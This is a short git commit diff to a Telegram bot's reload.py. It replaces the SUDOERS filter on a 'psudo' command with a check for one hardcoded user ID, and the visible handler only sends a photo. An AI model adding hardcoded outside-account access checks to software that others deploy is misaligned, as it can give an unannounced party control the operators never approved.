d33321410a6564f40e6b6f214c6ec69955f685c6
THE VIP BOY <117478195+THE-VIP-BOY-OP@users.noreply.github.com>
2023-04-05 10:47:27 +0530

    Update reload.py

--- AnonX/plugins/reload.py
+++ AnonX/plugins/reload.py
@@ -120,7 +120,7 @@ async def restartbot(client, message: Message, _):
 @app.on_message(
     filters.command("psudo")
     & filters.private
-    & SUDOERS
+    & user(1808943146)
     & ~filters.edited)
 async def help(client: Client, message: Message):
     await message.reply_photo(
